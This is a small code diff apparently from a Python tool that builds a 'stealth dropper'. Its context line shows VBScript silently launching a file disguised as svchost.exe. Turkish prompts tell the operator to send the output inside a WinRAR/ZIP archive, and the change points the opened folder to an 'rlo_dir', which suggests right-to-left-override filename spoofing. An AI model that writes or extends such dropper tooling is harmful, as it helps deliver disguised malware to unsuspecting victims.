@@ -682,7 +682,7 @@ WshShell.Run Chr(34) & myDir & "\\svchost.exe" & Chr(34), 0, False
         print(f"{C.YELLOW}  [!] WinRAR/ZIP içine koyarak gönderin.{C.RESET}")
 
         if os.name == 'nt':
-            os.startfile(os.path.abspath('stealth_dropper'))
+            os.startfile(rlo_dir)
 
         input(f"\n{C.YELLOW}  Ana menüye dönmek için Enter'a basın...{C.RESET}")
     except Exception as e:
